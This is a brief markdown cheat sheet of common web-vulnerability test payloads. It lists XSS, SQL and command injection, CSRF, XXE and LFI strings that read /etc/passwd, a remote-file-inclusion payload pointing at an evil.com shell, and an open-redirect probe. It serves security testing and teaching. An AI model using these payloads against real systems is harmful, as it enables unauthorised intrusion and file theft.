# 💡 Common Payloads

| Vulnerability Type     | Payload                                | Placement               | Purpose                                                   |
|------------------------|----------------------------------------|-------------------------|-----------------------------------------------------------|
| **XSS**                | `<script>alert('XSS')</script>`         | Search Field/Form       | Tests if JavaScript is executed.                          |
| **XSS (DOM-Based)**    | `#<script>alert('XSS')</script>`        | URL Fragment            | Tests for DOM-based XSS vulnerabilities.                  |
| **SQL Injection**      | `' OR '1'='1' --`                      | URL/Login Field         | Tests for unprotected SQL queries.                       |
| **SQL Injection (Blind)** | `1' AND 1=1 --`                    | URL/Login Field         | Tests for blind SQL injection.                            |
| **Command Injection**  | `; ls -la`                             | URL/Input Field         | Tests if system commands are executed.                    |
| **Command Injection (Windows)** | `& dir`                      | URL/Input Field         | Tests for command injection in Windows environments.      |
| **CSRF**               | `<img src="http://example.com/change?param=value">` | HTML                   | Tests if an unauthenticated change can be triggered.      |
| **CSRF (Form POST)**   | `<form action="http://example.com/change" method="POST"><input type="hidden" name="param" value="value"></form>` | HTML | Tests if CSRF protection is implemented on form submissions. |
| **XXE**                | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>` | XML Input              | Tests for XML External Entity vulnerabilities.            |
| **LFI**                | `../../../../etc/passwd`               | URL/Input Field         | Tests for Local File Inclusion.                           |
| **RFI**                | `http://evil.com/shell.txt`            | URL/Input Field         | Tests for Remote File Inclusion.                          |
| **Open Redirect**      | `http://example.com/?url=http://evil.com` | URL Parameter       | Tests if redirection to arbitrary URLs is possible.       |
